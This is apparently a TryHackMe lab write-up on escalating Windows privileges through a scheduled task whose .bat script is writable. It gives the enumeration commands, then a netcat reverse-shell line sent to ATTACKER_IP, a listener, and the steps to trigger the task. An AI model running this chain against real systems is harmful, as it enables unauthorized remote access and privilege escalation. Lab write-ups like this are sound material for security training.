Windows **Scheduled Tasks** automatically execute a command/program at a specific time or trigger. If a task runs as a **more privileged user** and we can modify the program it executes, we may be able to escalate privileges.

**Enumerate tasks:**
```cmd
schtasks
```

→ Lists scheduled tasks.
```cmd
schtasks /query /tn vuln_task /fo list /v
```
→ Shows detailed information about a specific task.

Important fields:
```text
Task To Run  → Program/script binary that gets executed
Run As User  → Account that executes it
```

**Check permissions:**
```cmd
icacls C:\tasks\schtask.bat
```
→ Shows who can read, modify, or execute the file.

Permission meanings:
```text
F → Full access
M → Modify
RX → Read + Execute
R → Read
W → Write
```

If your user has **write/full access** to a task's executable/script and the task runs as a higher-privileged user, the task may be exploitable.

**Run the task manually:**
```cmd
schtasks /run /tn vuln_task
```
→ Starts the scheduled task immediately.

**Check your privileges after execution:**
```cmd
whoami
```

---

###  Exploit — replace the `.bat` with a reverse shell

In the THM lab, `nc64.exe` is available at `C:\tools`:

```cmd
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

→ Replaces the task's `.bat` file with an **Netcat reverse shell**.
- `nc64.exe` → Netcat for Windows.
- `-e cmd.exe` → Attach `cmd.exe` to the network connection.
- `ATTACKER_IP 4444` → Connect back to your listener.

### 4. Start listener

On the attacker machine:
```bash
nc -lvnp 4444
```
→ Waits for the Windows machine to connect back.

### 5. Run the scheduled task

If we have permission to manually trigger it:
```cmd
schtasks /run /tn vulntask
```
→ Executes `vuln_task` immediately.
Otherwise, we would have to wait for its normal scheduled trigger.

### 6. Verify the shell

On the attacker machine:
```bash
nc -lvnp 4444
```

After the connection:
```cmd
whoami
```

Example:
```text
wprivesc1\taskusr1
```
→ We now have a shell running with the privileges of the account configured for the scheduled task.

### Exploitation chain

```text
Scheduled Task
      ↓
Task runs C:\tasks\schtask.bat
      ↓
BUILTIN\Users has (F)
      ↓
Modify schtask.bat
      ↓
Insert nc64 reverse shell
      ↓
schtasks /run /tn vulntask
      ↓
Reverse shell
      ↓
taskusr1 privileges
```

> **Key idea:** `Privileged task + writable task binary/script = privilege escalation opportunity.`